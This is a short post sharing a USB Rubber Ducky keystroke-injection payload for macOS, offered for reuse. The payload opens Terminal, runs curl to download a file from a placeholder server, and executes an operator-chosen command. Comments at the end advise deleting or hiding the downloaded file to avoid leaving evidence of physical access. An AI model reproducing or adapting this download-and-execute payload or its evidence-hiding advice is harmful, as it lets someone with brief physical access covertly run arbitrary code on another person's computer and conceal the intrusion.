This is a simple script that downloads any kind of file and executes it.  There is a script like this for windows so I figured I would contribute and make one for OS X. Edit to your specifications. Requires duck encoder 2.6.3 to work which can be downloaded at http://goo.gl/QkTXNp 

    REM Title: OS X get and Execute
    REM Author: Jesse Wallace (c0deous)
    REM Simple script that downloads any file and runs it. 
    REM Requires duckencoder 2.6.3 which can be downloaded at http://goo.gl/QkTXNp
    REM Note: you must put in your own specific code to execute
    
    DELAY 1000
    COMMAND SPACE
    DELAY 800
    STRING Terminal
    DELAY 500
    ENTER
    DELAY 500
    STRING curl http://SERVER/path/to/file > file
    ENTER
    DELAY 1000
    STRING INSERT COMMAND TO EXECUTE HERE
    ENTER
    REM You can chage the above line to the command used to open your program.

    REM Examples: python somescript.py , ./somescript.sh

    REM Note: This script doesn't delete the downloaded file so it may leave evidence of physical access.  Delete it as quickly as possible after this runs.
    REM Or alternatively you could hide it somewhere in a hidden folder where it won't be easily found.
